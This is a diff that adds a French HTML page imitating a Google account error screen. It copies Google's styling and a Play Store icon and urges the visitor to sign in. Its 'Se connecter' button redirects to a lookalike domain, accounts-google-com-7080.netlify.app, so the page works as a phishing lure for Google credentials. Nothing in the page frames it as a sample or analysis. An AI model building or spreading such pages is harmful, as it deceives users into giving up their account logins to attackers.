@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à votre compte</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            color: #202124;
+            min-height: 100vh;
+        }
+        
+        .header {
+            padding: 16px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        .back-button {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .back-button:hover {
+            background-color: #f1f3f4;
+        }
+        
+        .back-arrow {
+            width: 24px;
+            height: 24px;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        
+        .error-card {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        
+        .offline-icon {
+            font-size: 48px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        
+        .title {
+            font-size: 22px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        
+        .message {
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        
+        .connect-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            transition: all 0.2s;
+            text-decoration: none;
+            height: 40px;
+        }
+        
+        .connect-button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 3px 1px rgba(66, 64, 67, 0.15);
+        }
+        
+        .playstore-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="back-button">
+            <svg class="back-arrow" viewBox="0 0 24 24" fill="#5f6368">
+                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+            </svg>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="error-card">
+            <div class="offline-icon">⚠️</div>
+            <div class="title">Veuiller vous connecter a votre compte Google</div>
+            <div class="message">
+                Où vérifiez votre connexion Internet.<br>
+                Réessayez une fois reconnecté.
+            </div>
+            
+            <button class="connect-button" onclick="window.location.href='http://accounts-google-com-7080.netlify.app'">
+                <svg class="playstore-icon" viewBox="0 0 24 24" fill="white">
+                    <path d="M3 20.5v-17c0-.59.34-1.11.84-1.35L13.69 12l-9.85 9.85c-.5-.25-.84-.76-.84-1.35m13.81-5.38L6.05 21.34l8.49-8.49 2.27 2.27m3.35-4.31c.34.27.59.68.59 1.19s-.22.9-.57 1.18l-2.29 1.32-2.5-2.5 2.5-2.5 2.27 1.31M6.05 2.66l10.76 6.22-2.27 2.27-8.49-8.49z"/>
+                </svg>
+                Se connecter
+            </button>
+        </div>
+    </div>
+</body>
+</html>
